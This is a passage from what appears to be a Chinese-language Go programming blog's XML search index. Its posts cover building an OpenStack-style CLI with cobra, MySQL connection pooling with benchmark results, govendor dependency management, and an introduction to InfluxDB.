*io.PipeReader) &#123; data := make([]byte, 1024) for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = pipeReader.Read(tmp) if err != nil &amp;&amp; err != io.EOF &#123; log.Fatal(err) &#125; data = append(data, tmp[:n]...) &#125; fmt.Println("Data: ", string(data))&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Golang开发OpenStack服务的CLI]]></title>
      <url>%2F2017%2F04%2F23%2Fopenstack-golang-cli%2F</url>
      <content type="text"><![CDATA[由于我们需要编写自己服务的客户端，之前参考过magnum的python客户端，编写过一个，整体感受就是: 一件简单的事儿，被他封装的很复杂，而且还有一个关键痛点，部署问题: 1.依赖python环境 2. 蹩脚的二进制打包方式。 因此，作为一个产品的CLI，以二进制方式交付会带来诸多方便，比如cloud foundry也用golang重写了他的客户端部分。 Cobra简介在博客的开篇写过一篇cobra的博客: 如何使用golang编写漂亮的命令行工具, 很多流行的CLI都基于这个库开发，比如kubectl, etcdctl, docker等, 基本的概念和用法请参考之前的博客。不喜欢我啰嗦的，直接看源码:完整代码示例 基于RESTful的CLI打造的这个CLI是RESTful的客户端, 在RESTful里面以资源(Resource)为核心，因此客户端也需要以资源的形式表现, 比如Docker的 Management Commands:12345678910111213Management Commands: checkpoint Manage checkpoints container Manage containers image Manage images network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker volume Manage volumes 该资源允许的操作:1234567891011121314151617181920212223➜ uniresctl git:(dev_maojun) docker image -hFlag shorthand -h has been deprecated, please use --helpUsage: docker image COMMANDManage imagesOptions: --help Print usageCommands: build Build an image from a Dockerfile history Show the history of an image import Import the contents from a tarball to create a filesystem image inspect Display detailed information on one or more images load Load an image from a tar archive or STDIN ls List images prune Remove unused images pull Pull an image or a repository from a registry push Push an image or a repository to a registry rm Remove one or more images save Save one or more images to a tar archive (streamed to STDOUT by default) tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE 因此, 轮廓上我们需要打造这样一种风格的RESTful CLI OpenStack服务 CLI我们的OpenStack服务是自己开发的, 开发出来的CLI风格想要和Openstack社区风格一致(长相相近), 这东西社区是没有Golang版本的(有的话给我留言, 我真没找到), 因此整个架子需要自己构建, 由于cobra架子比较成熟, 如果只用官方的Flag库来做的话，会有很多重复工作, 因此使用cobra为基础来进行构建。 要做成和Openstack风格类似的CLI, 在cobra的基础上我们需要加入2个组件: keystone认证: 对每一个资源的访问必须通过keystone认证才能访问, 因此认证部分是全局的。 表格输出: OpenstackCLI把资源以Table的方式输出, 这个也需要单独实现。 搭建CLI架子 完整代码的栗子请看Github: 完整代码示例 初始化app, 添加resourceA和resourceB123cobra init app-clicobra add resourceAcobra add resourceB 访问每一个resource都需要经过keystone的认证,因此认证属于一个全局都要执行的逻辑, 必须放在最前面，这里Cobra提供的一组Hook可以解决这个问题 带错误处理的Hook当处理过程中如果产生了error可以直接return出来, 从而中断命令的继续执行, 因此认证部分我们需要这种带错误处理的Hook, 因为认证失败需要中断请求,其次，cobra 在命令函数的执行前后分别设置了2组Hook, 执行的顺序如下: PersistentPreRunE: 无论函数 执不执行 该函数都会运行 PreRunE: 在函数执行前执行 RunE: 执行函数 PostRunE: 函数执行后执行 PersistentPostRunE: 无论函数 执不执行 该函数都会执行 利用cobra提供的PersistentPreRunE来实现验证功能123456789101112// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "app-cli", Short: "A brief description of your application", Long: `A longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, PersistentPreRunE: auth,&#125; auth函数实现认证并不难, 关键是auth过后的token 如何传递给后面的子命令使用, 参考etcdctl和docker部分都使用上下文来实现这个需求, cobra里面也没有地方给我存上下文, 因此需要专门用一个模块来保持 全局的上下文, 因此需要手动实现一个common包。123456789101112131415161718192021222324252627282930313233343536package common// GlobalFlag use to contain the all contextvar GlobalFlag *globalFlagtype globalFlag struct &#123; endpoint string token string&#125;func (g *globalFlag) SetToken(token string) &#123; g.token = token&#125;func (g *globalFlag) GetToken() string &#123; return g.token&#125;func (g *globalFlag) SetEndPoint(url string) &#123; g.endpoint = url&#125;func (g *globalFlag) GetEndPoint() string &#123; return g.endpoint&#125;func (g *globalFlag) GetClient() *Client &#123; client, _ := NewClient(g.endpoint, g.token) return client&#125;func init() &#123; if GlobalFlag == nil &#123; GlobalFlag = &amp;globalFlag&#123;&#125; &#125;&#125; 最后在common包里面添加2个子包: keystone, printTable, keystone 用于实现与keystone认证的过程, printTable用于打印最后结果的表格,具体详情请看源码。 添加资源为每一个资源添加5个基础的操作:get, list, create, delete, update。另起一个resourceA的包，实现这些方法，添加到子命令即可， 比如:123456789func init() &#123; RootCmd.AddCommand(resourceACmd) resourceACmd.AddCommand(resourceA.CreateCmd, resourceA.ListCmd, resourceA.GetCmd, resourceA.UpdateCmd, resourceA.DeleteCmd)&#125; 大概效果如下123456789101112131415161718192021222324252627282930➜ app-cli git:(master) ✗ go run main.go resourceA -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: app-cli resourceA [flags] app-cli resourceA [command]Available Commands: create create an resource delete delete an resource get get an resource list list resources update update an resourceGlobal Flags: --api-endpoint string unires service endpoint --auth_url string keyston auth url --idenntity-api-version string keystone auth version --password string keystone auth user password --project-domain-name string keystone auth user project domain --project-name string keystone auth user project name --user-domain-name string keystone auth user domain name --username string keystone auth userUse "app-cli resourceA [command] --help" for more information about a command. 使用效果和使用openstack一样，你需要有一个admin_openrc 用于导入环境变量12345678export OS_USERNAME=adminexport OS_PASSWORD=adminexport OS_PROJECT_NAME=admin.cloudexport OS_USER_DOMAIN_NAME=adminexport OS_PROJECT_DOMAIN_NAME=adminexport OS_AUTH_URL=http://127.0.0.1:35357/v3export OS_IDENTITY_API_VERSION=3export UNIRES_ENDPOINT=http://127.0.0.1:8080 比如12source admin_openrc./app-cli resourceA get]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[golang中mysql连接池使用]]></title>
      <url>%2F2017%2F04%2F05%2Fgolang-mysql-connection-pool%2F</url>
      <content type="text"><![CDATA[在使用golang来处理数据库的时候，为了提升性能，往往都会使用连接池，有些人往往会自己实现一个连接池，用来互用mysql连接，但是如果你稍微细心一点， 就会发现内建的sql包已经实现了连接池。sql.Open函数实际上式返回一个连接池对象，而不是单个连接。 golang本身没有提供链接mysql的驱动，但是却定义了数据库的标准接口(内建的sql包), 第三方开发实现这些接口就完成了相应驱动的开发。第三方提供mysql的驱动比较多，遵循官方sql接口规范的也有好几个, 但是使用最广的,github上星最多应该是https://github.com/go-sql-driver/mysql, 以下的所有操作都以该驱动进行演示。 数据库的基本操作这里主要介绍数据库操作中一些常见操作，比如建表，以及数据的增删改查。 首先，我们需要创建一张表，用于存储数据, 我们可以通过db的Exec来执行SQL语句，比如下面是一个创建表的函数:123456789101112131415161718192021func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户编号', user_name VARCHAR(45) NOT NULL COMMENT '用户名称', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户年龄', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户性别', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户表'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125; 有了表过后，我们需要插入数据, 理论上可以将插入的SQL语句准备好, 填入Exec即可，但是sql已经对这种常用的场景抽象出了一个Prepare方法，Prepare方法将SQL的逻辑和数据剥离开来，通过占位符来生成一个SQL表达式(statement),然后表达式执行时，传入具体的需要插入的数据:123456789101112func insert() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125; 插入数据过会我们就可以，从中查询数据记录了，查询出来的数据以行为单位进行组织（Rows)， Row包含字段和值，通过rows.Columns()获取字段，通过rows.Next()获取值，这里需要注意Next()这个方法，它和python里面的生成器概要很像，Next返回一个bool值，表示是否有新的row数据准备好了，如果准备好了，使用rows.Scan()来获取准备好的数据1234567891011121314151617181920212223func query() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) for rows.Next() &#123; var userId int var userName string var userAge int var userSex int rows.Columns() err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) checkErr(err) fmt.Println(userId) fmt.Println(userName) fmt.Println(userAge) fmt.Println(userSex) &#125;&#125; 这样扫描我们的确能获取到数据，但是数据并没有被友好的组织起来，在python的mysql驱动中提供一个简单方法可以将这些行数据组织成一个dict返回，因此在golang中，我们可以将rows的数据组织成一个map返回，方便使用。12345678910111213141516171819202122232425262728func queryToMap() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) //字典类型 //构造scanArgs、values两个数组，scanArgs的每个值指向values相应值的地址 columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //将行数据保存到record字典 err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; fmt.Println(record) &#125;&#125; 接下来是数据的更新, 更新和数据的插入原理一致，只是在准备的SQL里面通过WHERE指定条件，以更新指定的数据记录。123456789101112func update() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`UPDATE user SET user_age=?,user_sex=? WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(21, 2, 1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; 最后是数据的删除，同理123456789101112func remove() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`DELETE FROM user WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; 如何设置连接池数据库标准接口里面有3个方法用于设置连接池的属性: SetConnMaxLifetime, SetMaxIdleConns, SetMaxOpenConns SetConnMaxLifetime: 设置一个连接的最长生命周期，因为数据库本身对连接有一个超时时间的设置，如果超时时间到了数据库会单方面断掉连接，此时再用连接池内的连接进行访问就会出错, 因此这个值往往要小于数据库本身的连接超时时间 SetMaxIdleConns: 连接池里面允许Idel的最大连接数, 这些Idel的连接 就是并发时可以同时获取的连接,也是用完后放回池里面的互用的连接, 从而提升性能。 SetMaxOpenConns: 设置最大打开的连接数，默认值为0表示不限制。控制应用于数据库建立连接的数量，避免过多连接压垮数据库。 代码上使用就很简单了, 初始化db时，根据需求设置好连接池。123456789var db *sql.DB func init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping()&#125; 性能对比连接池对性能的提升还是很明显的, 下面我们就测试对比一下 使用连接池和不使用连接池时的性能差别。测试代码如下(不使用连接池时 注释掉连接池相关设置):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( "database/sql" "fmt" "log" "net/http" "time" _ "github.com/go-sql-driver/mysql")var db *sql.DBfunc init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping() createTable() insert()&#125;func main() &#123; startHttpServer()&#125;func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户编号', user_name VARCHAR(45) NOT NULL COMMENT '用户名称', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户年龄', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户性别', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户表'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125;func insert() &#123; stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125;func queryToMap() []map[string]string &#123; var records []map[string]string rows, err := db.Query("SELECT * FROM user") defer rows.Close() checkErr(err) //字典类型 //构造scanArgs、values两个数组，scanArgs的每个值指向values相应值的地址 columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //将行数据保存到record字典 err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; records = append(records, record) &#125; return records&#125;func startHttpServer() &#123; http.HandleFunc("/pool", pool) err := http.ListenAndServe(":9090", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125;func pool(w http.ResponseWriter, r *http.Request) &#123; records := queryToMap() fmt.Println(records) fmt.Fprintln(w, "finish")&#125;func checkErr(err error) &#123; if err != nil &#123; fmt.Println(err) panic(err) &#125;&#125; 带连接池的测试结果:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455➜ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 0.832 secondsComplete requests: 1000Failed requests: 928 (Connect: 0, Receive: 0, Length: 928, Exceptions: 0)Total transferred: 114144 bytesHTML transferred: 6496 bytesRequests per second: 1201.65 [#/sec] (mean)Time per request: 83.219 [ms] (mean)Time per request: 0.832 [ms] (mean, across all concurrent requests)Transfer rate: 133.95 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 4 4.6 2 18Processing: 8 79 107.2 47 489Waiting: 0 71 107.9 40 488Total: 12 82 106.4 49 491Percentage of the requests served within a certain time (ms) 50% 49 66% 59 75% 67 80% 80 90% 159 95% 394 98% 450 99% 479 100% 491 (longest request) 去除连接池的设置后的测试结果:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455➜ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 1.467 secondsComplete requests: 1000Failed requests: 938 (Connect: 0, Receive: 0, Length: 938, Exceptions: 0)Total transferred: 115374 bytesHTML transferred: 6566 bytesRequests per second: 681.83 [#/sec] (mean)Time per request: 146.664 [ms] (mean)Time per request: 1.467 [ms] (mean, across all concurrent requests)Transfer rate: 76.82 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 1.7 1 19Processing: 8 139 106.8 109 415Waiting: 0 133 110.7 81 415Total: 10 141 107.4 110 418Percentage of the requests served within a certain time (ms) 50% 110 66% 210 75% 237 80% 250 90% 285 95% 321 98% 378 99% 393 100% 418 (longest request) 结论 同样的并发情况下, 使用连接池比没使用快一倍, 在高并发的情况下，应该更明显。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[golang包管理之vendor]]></title>
      <url>%2F2017%2F03%2F13%2Fgolang-pkg-management-tool%2F</url>
      <content type="text"><![CDATA[在使用Golang过程中，有一个非常令人头大的问题: 缺少依赖库版本功能管理, 比如某些依赖在某个commit之后发生了API变更之后，如果不修改代码很难兼容，然而开发者之间很有可能因为参与的时间不同，导致执行go get命令获取的版本不同，而导致各种问题, 甚至是编译不通过。因此需要有一个包依赖的版本控制工具。 vendor之前在vendor出来之前, 以godep为主比较流行, godep的原理非常简单:godep把第三包的版本依赖信息记录在Godeps.json下，并且把第三包完整拷贝一份到vendor下面。通过对Godeps.json文件进行版本管理即可以管理整个项目的第三方包依赖信息。 可以看到godep只是把第三方包进行单独到依赖管理，而新增到第三包还是会被get到GOPATH中, 如果多个项目用同一个第三包的不同版本时, 那就完蛋了 vendor的历史vendor机制就是用来解决第三方包依赖问题: golang 1.5引入, 默认是关闭的, 通过手动设置环境变量:GO15VENDOREXPERIMENT=1开启 golang 1.6默认开启 goalng 1.7 vendor作为功能支持,取消GO15VENDOREXPERIMENT环境变量 vendor的原理很简单: 将第三方依赖放入当前项目vendor目录中， 编译的时候从vendor目录中查找依赖而不从GOPATH/src中对应目录中查找。新增的第三方包直接被get到根目录的vendor文件夹下,不会与其它的项目混用第三方包，完美避免多个项目同用同一个第三方包的不同版本问题。因此只需要对vendor/vendor.json进行版本控制，即可对第三包依赖关系进行控制。 vendor的使用想要详细了解govendor请参考govendor 安装govendor 1go get -u -v github.com/kardianos/govendor 创建一个golang的项目 比如我创建一个简单的依赖ssh服务的包1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String()) 初始化vendor文件 12345678910111213➜ govendor_test govendor init➜ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;➜ govendor_test tree ..├── main.go└── vendor └── vendor.json 初始化完成后会生成一个vendor的文件夹, 因为我还没添加依赖, 所以vendor.json里面并没有相关依赖包的描述 添加依赖的第三方包 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182➜ govendor_test govendor add +external➜ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [ &#123; &quot;checksumSHA1&quot;: &quot;C1KKOxFoW7/W/NFNpiXK+boguNo=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/curve25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;wGb//LjBPNxYHqk+dcLo7BjPXK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;LXFcVx8I587SnWmKycSDEq9yvK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519/internal/edwards25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;fsrFs762jlaILyqqQImS1GfvIvw=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ssh&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125; ], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;➜ govendor_test tree ..├── main.go└── vendor ├── golang.org │ └── x │ └── crypto │ ├── LICENSE │ ├── PATENTS │ ├── curve25519 │ │ ├── const_amd64.h │ │ ├── const_amd64.s │ │ ├── cswap_amd64.s │ │ ├── curve25519.go │ │ ├── doc.go │ │ ├── freeze_amd64.s │ │ ├── ladderstep_amd64.s │ │ ├── mont25519_amd64.go │ │ ├── mul_amd64.s │ │ └── square_amd64.s │ ├── ed25519 │ │ ├── ed25519.go │ │ └── internal │ │ └── edwards25519 │ │ ├── const.go │ │ └── edwards25519.go │ └── ssh │ ├── buffer.go │ ├── certs.go │ ├── channel.go │ ├── cipher.go │ ├── client.go │ ├── client_auth.go │ ├── common.go │ ├── connection.go │ ├── doc.go │ ├── handshake.go │ ├── kex.go │ ├── keys.go │ ├── mac.go │ ├── messages.go │ ├── mux.go │ ├── server.go │ ├── session.go │ ├── tcpip.go │ └── transport.go └── vendor.json9 directories, 36 files 我们发现vendor.json的package已经记录了第三方包的版本,并且把这些依赖的包都放到vendor目录下了 根据自己的需求,选择是否将vendor目录做版本控制 一般只需要将vendor.json做版本控制即可,但是对于那些需要翻墙才能下载的包也可以直接将vendor都纳入版本控制添加.ignore.git仅对vendor.json做版本控制123456git initecho &quot;vendor/golang.or&quot; .gitignoregit add .git commit -m &quot;test commit&quot;git push -u origin master... 其他小伙伴安装依赖 其他小伙伴如果需要使用这个项目, 拉下该项目12git clone ssh://git@xxx/govendor_test.githttps_proxy=http://localhost:8123 govendor sync (我需要安装golang.org的包,因此需要FQ) 这样就安装了该项目的指定版本的第三个依赖。接下来愉快的玩耍吧!]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[时序数据库之InfluxDB]]></title>
      <url>%2F2017%2F03%2F10%2Fopentsdb-vs-influxdb%2F</url>
      <content type="text"><![CDATA[最近公司业务重度依赖时序数据库, 公司上个版本选择了OpenTSDB, 在1-2年前，他的确很流行。 但是在做软件重构时, 业务层反馈的一些问题, OpenTSDB暂时无法解决,成为了一个痛点, 让我需要考虑其他方案, 由于之前使用过InfluxDB, 也一直在关注, 它给了我惊艳的感觉,所以记忆犹新. 背景之前做运维时,重度使用过zabbix, 关系型数据库的优化,根本无法解决高IO, 后面又使用过Graphite, 这个安装像迷一样的工具, 它后端在RRD上面设计出了一个简单的时序数据库, 但是配置繁杂,容量完全靠规划。直到使用了InfluxDB, 部署简单,使用方便,高压缩, 对它印象很不错, 但是0.12过后不支持集群。 之前InfluxDB切换了2次存储引擎(它的存储是插件式的), 也没去了解过它切换的原因, 直到看到InfoQ上七牛的演讲从InfluxDB看时序数据的处, 他道出了了原因: LevelDB不支持热备份, influxDB设计的shard会消耗大量文件描述符，将系统资源耗尽。 BoltDB解决了热备, 解决了消耗大量文件描述符的问题, 但是引入了一个更致命的问题:容量达到数GB级别时,会产生大量随机写, 造成高IOPS。 放弃了他们, 在他们的经验上开始自己实现一个存储引擎: TSM(Time-Structured Merge Tree), 它截取了OpenTSDB的一些设计经验,根据LSM Tree针对时间序列数据进行优化 我认为像这样的针对特殊场景进行优化的数据库会是今后数据库领域发展的主流, 另一个证明就是EleasticSearch一个针对文本解索而设计的数据库, 虽然OpenTSDB也针对时序数据做了优化,但是由于存储系统依然依赖HBase, 所以力度上面感觉没InfluxDB给力。 社区一路走来之艰辛,但是却激情洋溢,他们是先行者. 我对它集群的闭源并不反感, 这群激情洋溢的人需要有商业支持。 时序数据库热度排名这是DB Engine的时序数据库2017的排行榜, 截图是2017-3月的，最新的可以点DB-Engines Ranking of Time Series DBMS上图可以看出InfluxDB最近很热, 领先优势明显下面是对比InfluxDB, OpenTSDB, Graphite的变化趋势。对于一个设计精良，部署简单，使用方便，而且还高性能的时序数据库而言, 想不热都难。 简介基于Go语言开发，社区非常活跃，项目更新速度很快，日新月异，关注度高, 1.0发布过后, 稳定性也非常高。官方是这样介绍InfluxDB的： influxdb是一个从底层一步一步成长为能处理高写入,高查询的时序数据库, 它专门针对时序数据做了优化,让其更高性能, 他可以用来存储任何时序数据, 包括DevOps的监控、应用指标、物联网传感器的数据, 并实时分析 这是它github上给出的特性说明: 内建HTTP API, 无需自己实现 数据高压缩, 支持非常灵活的查询访问 支持类SQL查询, 学习成本低, 方便使用 安装和管理都十分简单, 数据写入和读取的速度快 为实时查询而生, 对每一个点位都建立索引, 及时查询响应速度小于100ms 业务问题我们需要一个时序数据库, 他需要能解决我们以下这些问题: 一个测试指标多值一个指标往往有多个维度来描述其变化状态,并不仅仅是值, 比如对于CPU的而言, 应该有中断，负载, 使用率等。 多Tag支持tag是对一个指标的描述,是一个标签, 在业务上Tag对于分组过滤非常有意义, 用于标示一个指标在业务上的意义, 比如对于IOT来说, 传感器的指标往往是一个无意义的id, 因此需求给它打上name标签, 标示他的特殊意义, 打上设备ID, 标示它属于哪个设备, 打上位置标签, 标示该指标来源于哪个地方。 在指标的值上能做一些基本的比较运算作为一个数据库,在功能层面需要解决一些基本的运算, 比如求和，求最小，求最大, 但这还不够, 需要支持条件过滤, 支持Tag的条件过滤, 支持值的条件过滤, 支持值的条件过滤是关键, 不然会产生巨大的数据复制, 比如我们需要过滤出 CPU &gt; 90的机器, 如果数据库不支持, 那么我需要将这些数据从数据库中查出来,复制给我的程序处理。 这带来了巨大的问题: 1. 数据库要吐出如此大量的数据, 负载升高, 出口流量暴增 2.程序拿到如此大量的数据, 给处理方带来了巨大的计算压力, 如果前段采用Angular或者React来写, 一个运行在pc上的小小的浏览器,根本处理不了。3. 处理效率低，数据的处理本该在数据存储的地方进行, 比如Hadoop, 完全没必要复制。 指标计算的中间结果需要存会指标这是一个比较常见的场景, 使用RDD时更是常用,比如数据是按照30秒存储的，但是我需要 这样一个聚合维度 5m, 15m, 1h, 3h, 12h, 然后我平时只使用这些维度的数据, 不用每次临时计算。 概念介绍influxDB的核心概念包含: Line Protocol, Retention Policy, Series, Point, Continuous Query. Line ProtocolLine Protocol用于描述存入数据库的数据格式, 也可以说是数据协议, 相比于JSON格式，Line Protocol无需序列化，更加高效, 官方对它做了全面的介绍Line Protocol, 下面摘取语法部分做简要说明：Line Protocol里面的一行就是InfluxDB里面的一个点位, 他将一个点分割成measurement, tag_set, field_set, timestamp4个部分, 例如:12345678910语法格式: measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]栗子:weather,location=us-midwest temperature=82 1465839830100400200 | -------------------- -------------- | | | | | | | | |+-----------+--------+-+---------+-+---------+|measurement|,tag_set| |field_set| |timestamp|+-----------+--------+-+---------+-+---------+ measurement: metric name, 需要监控的指标的名称, 比如上面的weather tag_set: 使用”,”与measurement隔开, 表示一组Tag的集合, 用于保存点位的元数据, 为可选项, 会进行索引，方便查询时用于过滤条件， 格式: =,=, 比如上面的location=us-midwest field_set: 使用空格与tag_set隔开, 标示一组Field的集合, 用于保存该点位多维度的值, 支持各种类型，数据存储时不会进行索引,格式: =,=, 比如上面的temperature=82 timestamp: 采集该点位的时间戳, 时间的默认精度是纳秒. 存储策略:measurements,tag keys,field keys,tag values全局存一份。field values和timestamps每条数据存一份。 Retention Policy指数据的保存策略, 包含数据的保存时间和副本数(集群中的概念),默认保存时间是永久，副本是1个, 但是我们可以修改, 也可以创建新的保存策略 SeriesInfluxDB中元数据的数据结构体, series相当于是InfluxDB中元数据的集合，在同一个database中，retention policy、measurement、tag sets完全相同的数据同属于一个series，同一个series的数据在物理上会按照时间顺序排列存储在一起。series 的key为 